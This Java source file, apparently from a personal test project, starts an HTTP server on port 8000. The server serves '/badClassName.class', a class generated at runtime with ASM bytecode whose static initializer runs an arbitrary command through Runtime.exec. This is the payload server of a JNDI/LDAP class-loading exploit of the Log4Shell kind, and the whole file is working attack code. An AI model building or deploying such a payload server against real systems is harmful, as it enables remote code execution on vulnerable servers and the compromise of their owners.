package com.yale.test.java.classpath.ldap.server;

import java.io.IOException;
import java.io.OutputStream;
import java.net.InetSocketAddress;

import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;
import org.objectweb.asm.ClassWriter;
import org.objectweb.asm.Label;
import org.objectweb.asm.MethodVisitor;
import org.objectweb.asm.Opcodes;

import com.sun.net.httpserver.HttpExchange;
import com.sun.net.httpserver.HttpHandler;
import com.sun.net.httpserver.HttpServer;


/**
 * 依赖《asm-8.0.1.jar》
 * @author issuser
 */
public class Http {
	private static final Logger logger = LogManager.getLogger(Http.class);
	
	public static void start(String cmd) {
		try {
			int port = 8000;
			logger.error("Start http server:0.0.0.0:" + port);
			HttpServer server = HttpServer.create(new InetSocketAddress(port), 0);
			server.createContext("/badClassName.class", new TestHandler(cmd));
			server.start();
		} catch(Exception e) {
			e.printStackTrace();
			logger.error("ErrorMessage", e);
		}
	}
	
	static class TestHandler implements HttpHandler {
		private final String cmd;
		public TestHandler(String cmd) {
			this.cmd = cmd;
		}
		
		@Override
		public void handle(HttpExchange exchange) throws IOException {
			logger.error("开始了");
			ClassWriter classWriter = new ClassWriter(ClassWriter.COMPUTE_FRAMES);
			classWriter.visit(Opcodes.V1_8, Opcodes.ACC_PUBLIC | Opcodes.ACC_SUPER, "badClassName", null, "java/lang/Object", null);
			MethodVisitor methodVisitor = classWriter.visitMethod(Opcodes.ACC_PUBLIC, "<init>", "()V", null, null);
			methodVisitor.visitCode();
			methodVisitor.visitVarInsn(Opcodes.ALOAD, 0);
			methodVisitor.visitMethodInsn(Opcodes.INVOKESPECIAL, "java/lang/Object", "<init>", "()V", false);
			methodVisitor.visitInsn(Opcodes.RETURN);
			methodVisitor.visitMaxs(1, 1);
			methodVisitor.visitEnd();
			
			methodVisitor = classWriter.visitMethod(Opcodes.ACC_STATIC, "<clinit>", "()V", null, null);
			methodVisitor.visitCode();
			Label label0 = new Label();
			Label label1 = new Label();
			Label label2 = new Label();
			
			methodVisitor.visitTryCatchBlock(label0, label1, label2, "java/lang/Exception");
			methodVisitor.visitLabel(label0);
			//()Ljava/lang/Runtime;这里的分号不能少
			methodVisitor.visitMethodInsn(Opcodes.INVOKESTATIC, "java/lang/Runtime", "getRuntime", "()Ljava/lang/Runtime;", false);
			methodVisitor.visitLdcInsn(cmd);
			
			methodVisitor.visitMethodInsn(Opcodes.INVOKEVIRTUAL, "java/lang/Runtime", "exec", "(Ljava/lang/String;)Ljava/lang/Process;", false);
			methodVisitor.visitInsn(Opcodes.POP);
			methodVisitor.visitLabel(label1);
			
			Label label3 = new Label();
			methodVisitor.visitJumpInsn(Opcodes.GOTO, label3);
			methodVisitor.visitLabel(label2);
			methodVisitor.visitVarInsn(Opcodes.ASTORE, 0);
			methodVisitor.visitVarInsn(Opcodes.ALOAD, 0);
			methodVisitor.visitMethodInsn(Opcodes.INVOKEVIRTUAL, "java/lang/Exception", "printStackTrace", "()V", false);
			methodVisitor.visitLabel(label3);
			methodVisitor.visitInsn(Opcodes.RETURN);
			methodVisitor.visitMaxs(2, 1);
			methodVisitor.visitEnd();
			
			classWriter.visitEnd();
			byte[] data = classWriter.toByteArray();
			exchange.sendResponseHeaders(200, 0);
			OutputStream os = exchange.getResponseBody();
			os.write(data);
			os.close();
		}
	}
}
